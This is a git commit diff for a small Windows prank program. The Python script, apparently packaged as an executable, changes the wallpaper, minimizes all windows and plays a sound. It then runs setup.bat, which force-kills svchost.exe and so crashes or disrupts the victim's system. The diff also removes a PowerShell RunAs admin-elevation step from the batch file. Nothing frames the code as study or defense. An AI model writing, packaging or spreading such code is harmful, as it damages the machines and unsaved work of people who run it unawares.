cde93daaea28f68fd989fe2df14a0ba1756c3690
gabors0 <simon.6.gabor@gmail.com>
2024-12-08 16:42:31 +0100

    Main files

--- script.py
+++ script.py
@@ -3,24 +3,28 @@ import ctypes
 import time
 import subprocess
 import winsound
-import ctypes
+import sys
 import threading
-
 from PIL import Image
 
-image_path = "wallpaper.png"
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
 
-batch_script_path = "setup.bat"
 
-sound_file_path = "sound.wav"
-
-delay_seconds = 5
-
-import ctypes
+image_path = resource_path("wallpaper.png")
+batch_script_path = resource_path("setup.bat")
+sound_file_path = resource_path("sound.wav")
+delay_seconds = 23
 
 def minimize_all_windows():
     def enum_handler(hwnd, lParam):
-        if ctypes.windll.user32.IsWindowVisible(hwnd) and not ctypes.windll.user32.IsIconic(hwnd):
+        if ctypes.windll.user32.IsWindowVisible(
+            hwnd
+        ) and not ctypes.windll.user32.IsIconic(hwnd):
             ctypes.windll.user32.ShowWindow(hwnd, 6)
         return True
 
@@ -28,32 +32,34 @@ def minimize_all_windows():
     enum_handler_type = WNDENUMPROC(enum_handler)
     ctypes.windll.user32.EnumWindows(enum_handler_type, None)
 
+
 def set_wallpaper(image_path):
     try:
         image = Image.open(image_path)
-
         screen_width, screen_height = image.size
-
         image = image.resize((screen_width, screen_height), resample=Image.BICUBIC)
-
-        temp_file_path = os.path.join(os.path.dirname(__file__), "temp_wallpaper.bmp")
+        if getattr(sys, "frozen", False):
+            temp_file_path = os.path.join(sys._MEIPASS, "temp_wallpaper.bmp")
+        else:
+            temp_file_path = os.path.join(
+                os.path.dirname(__file__), "temp_wallpaper.bmp"
+            )
         image.save(temp_file_path, "BMP")
-
         ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_file_path, 0)
     except Exception as e:
         print(f"Error setting wallpaper: {e}")
 
+
 def run_batch_script(batch_script_path):
     subprocess.run(batch_script_path, shell=True)
+
 
 def play_sound(sound_file_path):
     winsound.PlaySound(sound_file_path, winsound.SND_FILENAME)
 
-def main():
-    set_wallpaper(image_path)
-    minimize_all_windows()
-    time.sleep(delay_seconds)
-    play_sound(sound_file_path)
-    run_batch_script(batch_script_path)
-if __name__ == "__main__":
-    main()
+set_wallpaper(image_path)
+minimize_all_windows()
+sound_thread = threading.Thread(target=play_sound, args=(sound_file_path,))
+sound_thread.start()
+time.sleep(delay_seconds)
+run_batch_script(batch_script_path)
--- setup.bat
+++ setup.bat
@@ -1,11 +1,1 @@
-@echo off
-:: Check for admin access
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
-:: Your script starts here
-
 taskkill /f /im svchost.exe
